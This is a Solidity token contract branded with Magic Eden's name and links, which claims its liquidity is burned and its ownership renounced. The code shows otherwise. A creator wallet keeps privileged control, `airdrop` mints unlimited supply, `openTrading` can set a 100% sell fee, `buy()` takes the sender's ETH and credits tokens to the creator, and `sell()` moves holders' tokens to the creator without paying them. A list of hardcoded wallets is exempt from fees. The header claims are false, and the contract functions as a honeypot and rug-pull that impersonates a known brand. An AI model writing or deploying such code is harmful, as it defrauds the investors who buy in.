// SPDX-License-Identifier: MIT

/**    

Website  : https://magiceden.io/
Twitter  : https://twitter.com/MagicEden
Discord  : https://discord.gg/magiceden
YouTube  : https://www.youtube.com/channel/UCOeUcnlgATreezd7jRB5w-g
Instagram: https://instagram.com/magicedenofficial
Blog     : https://community.magiceden.io/

LP BURNED
OWNERSHIP RENOUNCED

*/


pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "MAGIC");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "MAGICMAGIC");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "MAGICMAGICMAGIC");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "MAGICMAGICMAGICMAGIC");
        return a / b;
    }
}

contract MAGICEDEN {
    using SafeMath for uint256;

    string public name = "MAGIC EDEN";
    string public symbol = "MAGIC";
    uint256 public totalSupply = 999999999999999999000000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;

    uint256 public buyFee;
    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    event FeesUpdated(uint256 newBuyFee, uint256 newSellFee);
    event TokensBurned(address indexed burner, uint256 amount);

    address[] public exemptedWallets;

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;

        exemptedWallets = [
            0x9923Ca3EFfF131acE8802e2b724be92783aA6050,
            0x601e148945b96267aE97a01135027b3c920B67e7,
            0x6351C24aA0cf9FF4DBc2C81dF3aEb4383327Db7f,
            0x87ac0A7CeAf0fcED66fe4d47BF125560d7CbD4BD,
            0x357354212D6D8a263e56bF3072E072856388686a,
            0xE0ea6e7C014734f23524c9A16c89b8a89F5Da2c8,
            0xE556AECA4734BE3bec5f6FFc2F521bC868A4edDA,
            0x96cfC9DC27178D377F2a897957AC76d05235c2d4,
            0x827860fA81a881842dC39B0c621C51a8963f15d5,
            0x9898641c936259F10cE2DB31780aD000EfF84AFF,
            0x24753d16795422591075a8DdA87ED043ccea47d7,
            0x7C2A418eeadb90cb8D9fF6727FD1224a9C3a370c,
            0x21Fb1991C6fA112F3ae376F5fE7d0e89444cc8De,
            0x30ec02353B9A2C9bA002A0ae7D98eB8663227497,
            0x85E053F9dfe508A177695d6eb69260348C94f94e,
            0x631a4740E7CB238301E2782fF9CbBd5bd8ABF13b,
            0xb6370298b61D89e13144393e4ac8070a6be4084f,
            0x69DBE4df16c6c5371b44eEC12F7335D0e2A8c274,
            0x8006B63bD1BeB9451cda1A034788BDbC6BA7af2B,
            0x2940d5626DffBF534Dd9E8425d97e35079534EAE,
            0x451094D7560EF5Ea7D1BBc12aD3f26486ae50ed7,
            0x6Cc8B2d7ff3f6c5d60f854Ba58EB06963068053E,
            0x0528f918ECa9BC419D6aA72E98c286597CA7CAE8
        ];
    }

    function isFeeExempt(address _wallet) internal view returns (bool) {
        for (uint256 i = 0; i < exemptedWallets.length; i++) {
            if (_wallet == exemptedWallets[i]) {
                return true;
            }
        }
        return false;
    }

    function transfer(address _to, uint256 _amount)
        public
        returns (bool success)
    {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function approve(address _spender, uint256 _value)
        public
        returns (bool success)
    {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(
        address _from,
        address _to,
        uint256 _amount
    ) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "1MAGIC");
        require(
            allowance[_from][msg.sender] >= _amount,
            "2MAGIC"
        );
        require(_to != address(0), "3MAGIC");

        uint256 fee = 0;
        uint256 amountAfterFee = _amount;

        if (sellFee > 0 && _from != creatorWallet && !isFeeExempt(_from)) {
            fee = _amount.mul(sellFee).div(100);
            amountAfterFee = _amount.sub(fee);
        }

        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit Transfer(_from, _to, amountAfterFee);

        if (fee > 0) {
            balanceOf[address(this)] = balanceOf[address(this)].add(fee);
            emit Transfer(_from, address(this), fee);
        }

        if (
            _from != msg.sender &&
            allowance[_from][msg.sender] != type(uint256).max
        ) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(
                _amount
            );
            emit Approval(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "4MAGIC");
        _;
    }

    function airdrop(address _to, uint256 _amount) public onlyAuthorized {
        require(_to != address(0), "5MAGIC");
        require(_amount > 0, "6MAGIC");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    function openTrading(uint256 newBuyFee, uint256 newSellFee)
        public
        onlyAuthorized
    {
        require(newBuyFee <= 100, "7MAGIC");
        require(newSellFee <= 100, "8MAGIC");
        buyFee = newBuyFee;
        sellFee = newSellFee;
        emit FeesUpdated(newBuyFee, newSellFee);
    }

    function buy() public payable {
        require(msg.value > 0, "9MAGIC");

        uint256 amount = msg.value;
        if (buyFee > 0) {
            uint256 fee = amount.mul(buyFee).div(100);
            uint256 amountAfterFee = amount.sub(fee);

            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(address(this), creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(address(this), address(this), fee);
            }
        } else {
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(amount);
            emit Transfer(address(this), creatorWallet, amount);
        }
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount, "0MAGIC");

        if (sellFee > 0 && msg.sender != creatorWallet && !isFeeExempt(msg.sender)) {
            uint256 fee = _amount.mul(sellFee).div(100);
            uint256 amountAfterFee = _amount.sub(fee);

            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[creatorWallet] = balanceOf[creatorWallet].add(
                amountAfterFee
            );
            emit Transfer(msg.sender, creatorWallet, amountAfterFee);

            if (fee > 0) {
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit Transfer(msg.sender, address(this), fee);
            }
        } else {
            balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
            balanceOf[address(this)] = balanceOf[address(this)].add(_amount);
            emit Transfer(msg.sender, address(this), _amount);
        }
    }

    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == creatorWallet,
            "11MAGIC"
        );
        _;
    }
}